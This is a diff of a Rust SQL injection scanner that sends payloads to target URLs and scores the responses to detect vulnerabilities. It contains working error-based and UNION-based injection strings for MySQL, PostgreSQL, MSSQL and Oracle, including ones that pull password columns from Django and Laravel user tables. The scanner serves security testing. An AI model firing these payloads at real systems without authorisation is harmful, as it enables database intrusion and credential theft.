+                "' AND jsonb_object_agg('k','v') IS NOT NULL--",
+                "JSONB object aggregation",
+            ),
         ];
 
         let concurrent_requests = match config.scan_mode.as_str() {
@@ -1998,7 +2205,13 @@ impl EnhancedSqliScanner {
 
                 async move {
                     match client.get(&test_url).await {
-                        Ok(response) => Some((payload.to_string(), response, test_url, baseline_clone, technique_name)),
+                        Ok(response) => Some((
+                            payload.to_string(),
+                            response,
+                            test_url,
+                            baseline_clone,
+                            technique_name,
+                        )),
                         Err(e) => {
                             debug!("JSON operator test failed: {}", e);
                             None
@@ -2081,10 +2294,12 @@ impl EnhancedSqliScanner {
                                       3. Implement strict input validation\n\
                                       4. Apply least privilege for database users\n\
                                       5. Update WAF rules for JSON operator patterns\n\
-                                      6. Monitor for unusual JSON queries".to_string(),
+                                      6. Monitor for unusual JSON queries"
+                            .to_string(),
                         discovered_at: chrono::Utc::now().to_rfc3339(),
                         ml_data: None,
-                    }.with_ml_data(&response, Some(&baseline), Some(&payload));
+                    }
+                    .with_ml_data(&response, Some(&baseline), Some(&payload));
 
                     if self.is_new_vulnerability(&vuln) {
                         info!("PostgreSQL JSON operator SQLi detected: {}", technique);
@@ -2161,7 +2376,8 @@ impl EnhancedSqliScanner {
         tests_run += payload_count;
 
         for result in results {
-            if let Some((payload, response, test_url, baseline, technique, error_pattern)) = result {
+            if let Some((payload, response, test_url, baseline, technique, error_pattern)) = result
+            {
                 let body_lower = response.body.to_lowercase();
 
                 // Check for specific error patterns
@@ -2238,10 +2454,12 @@ impl EnhancedSqliScanner {
                                       4. Validate and sanitize all inputs\n\
                                       5. Apply least privilege for database users\n\
                                       6. Log errors server-side only\n\
-                                      7. Use WAF with error-based SQLi detection".to_string(),
+                                      7. Use WAF with error-based SQLi detection"
+                            .to_string(),
                         discovered_at: chrono::Utc::now().to_rfc3339(),
                         ml_data: None,
-                    }.with_ml_data(&response, Some(&baseline), Some(&payload));
+                    }
+                    .with_ml_data(&response, Some(&baseline), Some(&payload));
 
                     if self.is_new_vulnerability(&vuln) {
                         info!("Enhanced error-based SQLi detected: {}", technique);
@@ -2259,7 +2477,11 @@ impl EnhancedSqliScanner {
     }
 
     /// Get enhanced error-based payloads
-    fn get_enhanced_error_payloads(&self, db_type: &DatabaseType, context: &InjectionContext) -> Vec<(&'static str, &'static str, &'static str)> {
+    fn get_enhanced_error_payloads(
+        &self,
+        db_type: &DatabaseType,
+        context: &InjectionContext,
+    ) -> Vec<(&'static str, &'static str, &'static str)> {
         let mut payloads = Vec::new();
 
         match db_type {
@@ -2270,31 +2492,31 @@ impl EnhancedSqliScanner {
                         payloads.push((
                             " AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e))",
                             "XML extraction (EXTRACTVALUE)",
-                            "XPATH"
+                            "XPATH",
                         ));
                         payloads.push((
                             " AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION()),0x7e),1)",
                             "XML extraction (UPDATEXML)",
-                            "XPATH"
+                            "XPATH",
                         ));
 
                         // Geometric functions
                         payloads.push((
                             " AND GTID_SUBSET(CONCAT(0x7e,(SELECT USER()),0x7e),1)",
                             "Geometric function (GTID_SUBSET)",
-                            "gtid"
+                            "gtid",
                         ));
                         payloads.push((
                             " AND GEOMETRYCOLLECTION((SELECT * FROM(SELECT USER())x))",
                             "Geometric collection",
-                            "geometrycollection"
+                            "geometrycollection",
                         ));
 
                         // Type conversion errors
                         payloads.push((
                             " AND EXP(~(SELECT * FROM(SELECT DATABASE())x))",
                             "Exponential overflow",
-                            "exp"
+                            "exp",
                         ));
                     }
                     _ => {
@@ -2306,12 +2528,12 @@ impl EnhancedSqliScanner {
                         payloads.push((
                             "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION()),0x7e),1) AND '1'='1",
                             "XML extraction (UPDATEXML)",
-                            "XPATH"
+                            "XPATH",
                         ));
                         payloads.push((
                             "' AND EXP(~(SELECT * FROM(SELECT USER())x)) AND '1'='1",
                             "Exponential overflow",
-                            "exp"
+                            "exp",
                         ));
                     }
                 }
@@ -2323,7 +2545,7 @@ impl EnhancedSqliScanner {
                         payloads.push((
                             " AND CAST((SELECT current_database()) AS int)",
                             "Type casting extraction",
-                            "invalid input syntax"
+                            "invalid input syntax",
                         ));
                         payloads.push((
                             " AND 1=(SELECT 1/(SELECT 0 FROM (SELECT current_user) AS x WHERE 1=1))",
@@ -2335,19 +2557,19 @@ impl EnhancedSqliScanner {
                         payloads.push((
                             " AND CAST(XMLPARSE(DOCUMENT (SELECT current_database())) AS text)",
                             "XML parsing extraction",
-                            "xml"
+                            "xml",
                         ));
                     }
                     _ => {
                         payloads.push((
                             "' AND CAST((SELECT current_database()) AS int)::text='1",
                             "Type casting extraction",
-                            "invalid input syntax"
+                            "invalid input syntax",
                         ));
                         payloads.push((
                             "' AND 1::int=current_user::int AND '1'='1",
                             "Type mismatch",
-                            "invalid"
+                            "invalid",
                         ));
                     }
                 }
@@ -2359,58 +2581,56 @@ impl EnhancedSqliScanner {
                         payloads.push((
                             " AND 1=CONVERT(INT,(SELECT @@version))",
                             "Type conversion extraction",
-                            "conversion failed"
+                            "conversion failed",
                         ));
                         payloads.push((
                             " AND 1=CAST((SELECT DB_NAME()) AS int)",
                             "CAST extraction",
-                            "conversion"
+                            "conversion",
                         ));
 
                         // Geometric/spatial
                         payloads.push((
                             " AND 1=geometry::Point((SELECT SYSTEM_USER),0,0).ToString()",
                             "Geometry function",
-                            "geometry"
+                            "geometry",
                         ));
                     }
                     _ => {
                         payloads.push((
                             "' AND 1=CONVERT(INT,(SELECT @@version)) AND '1'='1",
                             "Type conversion extraction",
-                            "conversion failed"
+                            "conversion failed",
                         ));
                         payloads.push((
                             "' AND 1=CAST((SELECT DB_NAME()) AS int) AND '1'='1",
                             "CAST extraction",
-                            "conversion"
+                            "conversion",
                         ));
                     }
                 }
             }
-            DatabaseType::Oracle => {
-                match context {
-                    InjectionContext::Numeric => {
-                        payloads.push((
-                            " AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))",
-                            "Context indexing",
-                            "DRG"
-                        ));
-                        payloads.push((
-                            " AND UTL_INADDR.get_host_name((SELECT user FROM dual))",
-                            "Network function",
-                            "ORA-"
-                        ));
-                    }
-                    _ => {
-                        payloads.push((
-                            "' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))='1",
-                            "Context indexing",
-                            "DRG"
-                        ));
-                    }
+            DatabaseType::Oracle => match context {
+                InjectionContext::Numeric => {
+                    payloads.push((
+                        " AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))",
+                        "Context indexing",
+                        "DRG",
+                    ));
+                    payloads.push((
+                        " AND UTL_INADDR.get_host_name((SELECT user FROM dual))",
+                        "Network function",
+                        "ORA-",
+                    ));
                 }
-            }
+                _ => {
+                    payloads.push((
+                        "' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))='1",
+                        "Context indexing",
+                        "DRG",
+                    ));
+                }
+            },
             _ => {
                 // Generic payloads for unknown databases
                 match context {
@@ -2418,14 +2638,14 @@ impl EnhancedSqliScanner {
                         payloads.push((
                             " AND CAST((SELECT 1) AS int)",
                             "Generic type casting",
-                            "error"
+                            "error",
                         ));
                     }
                     _ => {
                         payloads.push((
                             "' AND CAST((SELECT 1) AS int)='1",
                             "Generic type casting",
-                            "error"
+                            "error",
                         ));
                     }
                 }
@@ -2454,7 +2674,9 @@ impl EnhancedSqliScanner {
             "updatexml",
         ];
 
-        leak_patterns.iter().any(|pattern| body_lower.contains(pattern))
+        leak_patterns
+            .iter()
+            .any(|pattern| body_lower.contains(pattern))
     }
 
     /// Extract leaked data from error messages
@@ -2505,7 +2727,10 @@ impl EnhancedSqliScanner {
             }
 
             // Boost for API endpoints
-            if matches!(ctx.endpoint_type, EndpointType::RestApi | EndpointType::GraphQlApi) {
+            if matches!(
+                ctx.endpoint_type,
+                EndpointType::RestApi | EndpointType::GraphQlApi
+            ) {
                 boost += 1;
             }
         }
@@ -2514,7 +2739,11 @@ impl EnhancedSqliScanner {
     }
 
     /// Get framework-specific SQL injection payloads
-    fn get_framework_specific_payloads(&self, context: &ScanContext, injection_context: &InjectionContext) -> Vec<String> {
+    fn get_framework_specific_payloads(
+        &self,
+        context: &ScanContext,
+        injection_context: &InjectionContext,
+    ) -> Vec<String> {
         let mut payloads = Vec::new();
 
         // Django ORM bypass patterns
@@ -2540,7 +2769,8 @@ impl EnhancedSqliScanner {
                                 // Django template injection via SQL
                                 "' UNION SELECT NULL,NULL,'{{7*7}}'--".to_string(),
                                 // Django-specific table access
-                                "' UNION SELECT username,password,NULL FROM auth_user--".to_string(),
+                                "' UNION SELECT username,password,NULL FROM auth_user--"
+                                    .to_string(),
                             ]);
                         }
                     }
@@ -2563,7 +2793,8 @@ impl EnhancedSqliScanner {
                                 "' OR '1'='1') --".to_string(),
                                 "' OR 1=1) --".to_string(),
                                 // Laravel migrations table
-                                "' UNION SELECT NULL,migration,batch,NULL FROM migrations--".to_string(),
+                                "' UNION SELECT NULL,migration,batch,NULL FROM migrations--"
+                                    .to_string(),
                                 // Laravel users table
                                 "' UNION SELECT id,name,email,password FROM users--".to_string(),
                             ]);
@@ -2582,7 +2813,8 @@ impl EnhancedSqliScanner {
                         _ => {
                             payloads.extend(vec![
                                 "' OR '1'='1'--".to_string(),
-                                "' UNION SELECT NULL,NULL,version,NULL FROM schema_migrations--".to_string(),
+                                "' UNION SELECT NULL,NULL,version,NULL FROM schema_migrations--"
+                                    .to_string(),
                             ]);
                         }
                     }
@@ -2642,7 +2874,10 @@ impl EnhancedSqliScanner {
         hypothesis_engine: &mut HypothesisEngine,
         config: &ScanConfig,
     ) -> Result<(Vec<Vulnerability>, usize)> {
-        debug!("[SQLi] Starting Bayesian hypothesis-guided testing for parameter '{}'", parameter);
+        debug!(
+            "[SQLi] Starting Bayesian hypothesis-guided testing for parameter '{}'",
+            parameter
+        );
 
         let mut vulnerabilities = Vec::new();
         let mut tests_run = 0;
@@ -2673,7 +2908,10 @@ impl EnhancedSqliScanner {
             };
 
             // Check if hypothesis has been resolved
-            if matches!(best_hypothesis.status, HypothesisStatus::Confirmed | HypothesisStatus::Rejected) {
+            if matches!(
+                best_hypothesis.status,
+                HypothesisStatus::Confirmed | HypothesisStatus::Rejected
+            ) {
                 debug!(
                     "[SQLi] Hypothesis {} resolved: {:?} (p={:.3})",
                     hypothesis_id, best_hypothesis.status, best_hypothesis.posterior_probability
@@ -2726,9 +2964,19 @@ impl EnhancedSqliScanner {
 
             // Execute the test
             let test_url = if base_url.contains('?') {
-                format!("{}&{}={}", base_url, parameter, urlencoding::encode(&test.payload))
+                format!(
+                    "{}&{}={}",
+                    base_url,
+                    parameter,
+                    urlencoding::encode(&test.payload)
+                )
             } else {
-                format!("{}?{}={}", base_url, parameter, urlencoding::encode(&test.payload))
+                format!(
+                    "{}?{}={}",
+                    base_url,
+                    parameter,
+                    urlencoding::encode(&test.payload)
+                )
             };
 
             tests_run += 1;
@@ -2742,7 +2990,8 @@ impl EnhancedSqliScanner {
                         EvidenceType::BehaviorChange,
                         format!("Request failed: {}", e),
                         0.5, // Neutral-ish
-                    ).with_payload(&test.payload);
+                    )
+                    .with_payload(&test.payload);
                     hypothesis_engine.update_with_evidence(&hypothesis_id, evidence);
                     continue;
                 }
@@ -2768,19 +3017,17 @@ impl EnhancedSqliScanner {
             hypothesis_engine.update_with_evidence(&hypothesis_id, evidence);
 
             // Check if we found a clear vulnerability during testing
-            if let Some(vuln) = self.detector.detect_sqli(
-                &test_url,
-                parameter,
-                &test.payload,
-                &response,
-                baseline,
-            ) {
+            if let Some(vuln) =
+                self.detector
+                    .detect_sqli(&test_url, parameter, &test.payload, &response, baseline)
+            {
                 // Strong positive evidence - update hypothesis significantly
                 let strong_evidence = Evidence::new(
                     EvidenceType::ExploitSuccess,
                     format!("SQLi detected by detector: {}", vuln.vuln_type),
                     15.0, // Very strong evidence
-                ).with_payload(&test.payload);
+                )
+                .with_payload(&test.payload);
                 hypothesis_engine.update_with_evidence(&hypothesis_id, strong_evidence);
 
                 if self.is_new_vulnerability(&vuln) {
@@ -2798,7 +3045,10 @@ impl EnhancedSqliScanner {
 
             // Early exit in fast mode if we have high confidence
             if config.scan_mode.as_str() == "fast" && best_hypothesis.posterior_probability > 0.7 {
-                debug!("[SQLi] Fast mode: probability sufficient ({:.3})", best_hypothesis.posterior_probability);
+                debug!(
+                    "[SQLi] Fast mode: probability sufficient ({:.3})",
+                    best_hypothesis.posterior_probability
+                );
                 break;
             }
         }
@@ -2860,7 +3110,8 @@ impl EnhancedSqliScanner {
                     EvidenceType::ErrorMessage,
                     format!("SQL error pattern detected: '{}'", pattern),
                     likelihood_ratio,
-                ).with_payload(payload);
+                )
+                .with_payload(payload);
             }
         }
 
@@ -2870,7 +3121,8 @@ impl EnhancedSqliScanner {
                 EvidenceType::StatusCodeChange,
                 format!("Server error (500) triggered by payload"),
                 5.0, // Moderately strong evidence
-            ).with_payload(payload);
+            )
+            .with_payload(payload);
         }
 
         if response.status_code == 400 && baseline.status_code != 400 {
@@ -2878,7 +3130,8 @@ impl EnhancedSqliScanner {
                 EvidenceType::StatusCodeChange,
                 "Bad request (400) triggered by payload".to_string(),
                 3.0,
-            ).with_payload(payload);
+            )
+            .with_payload(payload);
         }
 
         // Check for timing anomalies (for time-based tests)
@@ -2886,15 +3139,23 @@ impl EnhancedSqliScanner {
         if timing_diff > 4000 {
             return Evidence::new(
                 EvidenceType::TimingAnomaly,
-                format!("Significant delay: {}ms (baseline: {}ms)", response.duration_ms, baseline.duration_ms),
+                format!(
+                    "Significant delay: {}ms (baseline: {}ms)",
+                    response.duration_ms, baseline.duration_ms
+                ),
                 10.0, // Strong evidence for time-based injection
-            ).with_payload(payload);
+            )
+            .with_payload(payload);
         } else if timing_diff > 2000 {
             return Evidence::new(
                 EvidenceType::TimingAnomaly,
-                format!("Moderate delay: {}ms (baseline: {}ms)", response.duration_ms, baseline.duration_ms),
+                format!(
+                    "Moderate delay: {}ms (baseline: {}ms)",
+                    response.duration_ms, baseline.duration_ms
+                ),
                 4.0,
-            ).with_payload(payload);
+            )
+            .with_payload(payload);
         }
 
         // Check for significant response length changes
@@ -2905,21 +3166,34 @@ impl EnhancedSqliScanner {
             if change_ratio > 0.5 {
                 return Evidence::new(
                     EvidenceType::LengthAnomaly,
-                    format!("Significant response length change: {} bytes ({}% change)", len_diff, (change_ratio * 100.0) as i32),
+                    format!(
+                        "Significant response length change: {} bytes ({}% change)",
+                        len_diff,
+                        (change_ratio * 100.0) as i32
+                    ),
                     2.5,
-                ).with_payload(payload);
+                )
+                .with_payload(payload);
             }
         }
 
         // Check for WAF/filter detection
-        let waf_patterns = ["blocked", "forbidden", "access denied", "not allowed", "waf", "firewall"];
+        let waf_patterns = [
+            "blocked",
+            "forbidden",
+            "access denied",
+            "not allowed",
+            "waf",
+            "firewall",
+        ];
         for pattern in waf_patterns {
             if body_lower.contains(pattern) && !baseline.body.to_lowercase().contains(pattern) {
                 return Evidence::new(
                     EvidenceType::WafDetected,
                     format!("Possible WAF/filter detected: '{}'", pattern),
                     0.3, // WAF presence is negative evidence for exploitability
-                ).with_payload(payload);
+                )
+                .with_payload(payload);
             }
         }
 
@@ -2929,7 +3203,8 @@ impl EnhancedSqliScanner {
                 EvidenceType::ContentReflection,
                 "Payload reflected in response".to_string(),
                 1.5, // Weak positive evidence
-            ).with_payload(payload);
+            )
+            .with_payload(payload);
         }
 
         // Check for behavior change based on expected evidence type
@@ -2938,9 +3213,13 @@ impl EnhancedSqliScanner {
             if similarity < 0.5 {
                 return Evidence::new(
                     EvidenceType::BehaviorChange,
-                    format!("Significant behavior change (similarity: {:.1}%)", similarity * 100.0),
+                    format!(
+                        "Significant behavior change (similarity: {:.1}%)",
+                        similarity * 100.0
+                    ),
                     2.0,
-                ).with_payload(payload);
+                )
+                .with_payload(payload);
             }
         }
 
@@ -2949,7 +3228,8 @@ impl EnhancedSqliScanner {
             EvidenceType::BehaviorChange,
             "No significant change detected".to_string(),
             0.7, // Slightly below 1.0 - weak negative evidence
-        ).with_payload(payload)
+        )
+        .with_payload(payload)
     }
 
     /// Create a vulnerability from a confirmed hypothesis
@@ -2966,8 +3246,15 @@ impl EnhancedSqliScanner {
         };
 
         // Collect evidence summary
-        let evidence_summary: Vec<String> = hypothesis.evidence.iter()
-            .map(|e| format!("- {:?}: {} (LR: {:.2})", e.evidence_type, e.observation, e.likelihood_ratio))
+        let evidence_summary: Vec<String> = hypothesis
+            .evidence
+            .iter()
+            .map(|e| {
+                format!(
+                    "- {:?}: {} (LR: {:.2})",
+                    e.evidence_type, e.observation, e.likelihood_ratio
+                )
+            })
             .collect();
 
         let evidence_text = format!(
@@ -2994,7 +3281,9 @@ impl EnhancedSqliScanner {
         };
 
         // Get the most impactful payload used
-        let payload = hypothesis.evidence.iter()
+        let payload = hypothesis
+            .evidence
+            .iter()
             .filter(|e| e.likelihood_ratio > 5.0)
             .filter_map(|e| e.test_payload.clone())
             .next()
@@ -3036,7 +3325,12 @@ impl EnhancedSqliScanner {
 
     /// Check if vulnerability is new (thread-safe deduplication)
     fn is_new_vulnerability(&self, vuln: &Vulnerability) -> bool {
-        let signature = format!("{}:{}:{}", vuln.url, vuln.parameter.as_ref().unwrap_or(&String::new()), vuln.vuln_type);
+        let signature = format!(
+            "{}:{}:{}",
+            vuln.url,
+            vuln.parameter.as_ref().unwrap_or(&String::new()),
+            vuln.vuln_type
+        );
 
         let mut confirmed = match self.confirmed_vulns.lock() {
             Ok(guard) => guard,
@@ -3097,7 +3391,9 @@ mod tests {
                 duration_ms: 100,
             };
 
-            let context = scanner.detect_injection_context("http://example.com?id=123", "id", &baseline).await;
+            let context = scanner
+                .detect_injection_context("http://example.com?id=123", "id", &baseline)
+                .await;
             assert_eq!(context, InjectionContext::Numeric);
         });
     }
@@ -3157,7 +3453,8 @@ mod tests {
             form_fields: vec![],
             content_type: None,
         };
-        let payloads = scanner.get_framework_specific_payloads(&django_context, &InjectionContext::String);
+        let payloads =
+            scanner.get_framework_specific_payloads(&django_context, &InjectionContext::String);
         assert!(!payloads.is_empty());
         assert!(payloads.iter().any(|p| p.contains("auth_user")));
 
@@ -3174,7 +3471,8 @@ mod tests {
             form_fields: vec![],
             content_type: None,
         };
-        let payloads = scanner.get_framework_specific_payloads(&laravel_context, &InjectionContext::String);
+        let payloads =
+            scanner.get_framework_specific_payloads(&laravel_context, &InjectionContext::String);
         assert!(!payloads.is_empty());
         assert!(payloads.iter().any(|p| p.contains("migrations")));
 
@@ -3191,7 +3489,8 @@ mod tests {
             form_fields: vec![],
             content_type: None,
         };
-        let payloads = scanner.get_framework_specific_payloads(&graphql_context, &InjectionContext::String);
+        let payloads =
+            scanner.get_framework_specific_payloads(&graphql_context, &InjectionContext::String);
         assert!(!payloads.is_empty());
         assert!(payloads.iter().any(|p| p.contains("__typename")));
     }
@@ -3263,7 +3562,10 @@ mod tests {
             "test",
             &EvidenceType::StatusCodeChange,
         );
-        assert!(matches!(evidence.evidence_type, EvidenceType::StatusCodeChange));
+        assert!(matches!(
+            evidence.evidence_type,
+            EvidenceType::StatusCodeChange
+        ));
         assert!(evidence.likelihood_ratio > 3.0);
 
         // Test timing anomaly
@@ -3279,7 +3581,10 @@ mod tests {
             "' AND SLEEP(5)--",
             &EvidenceType::TimingAnomaly,
         );
-        assert!(matches!(evidence.evidence_type, EvidenceType::TimingAnomaly));
+        assert!(matches!(
+            evidence.evidence_type,
+            EvidenceType::TimingAnomaly
+        ));
         assert!(evidence.likelihood_ratio > 8.0); // Strong evidence for time-based
 
         // Test no change (weak negative evidence)
@@ -3321,7 +3626,8 @@ mod tests {
 
         // Should have at least SQLi hypothesis
         assert!(!hypotheses.is_empty());
-        let sqli_hyp = hypotheses.iter()
+        let sqli_hyp = hypotheses
+            .iter()
             .find(|h| matches!(h.hypothesis_type, HypothesisType::SqlInjection { .. }));
         assert!(sqli_hyp.is_some());
 
@@ -3359,12 +3665,9 @@ mod tests {
                     EvidenceType::ErrorMessage,
                     "MySQL syntax error".to_string(),
                     12.0,
-                ).with_payload("' OR '1'='1"),
-                Evidence::new(
-                    EvidenceType::StatusCodeChange,
-                    "500 error".to_string(),
-                    5.0,
-                ),
+                )
+                .with_payload("' OR '1'='1"),
+                Evidence::new(EvidenceType::StatusCodeChange, "500 error".to_string(), 5.0),
             ],
             suggested_tests: vec![],
             status: HypothesisStatus::Confirmed,
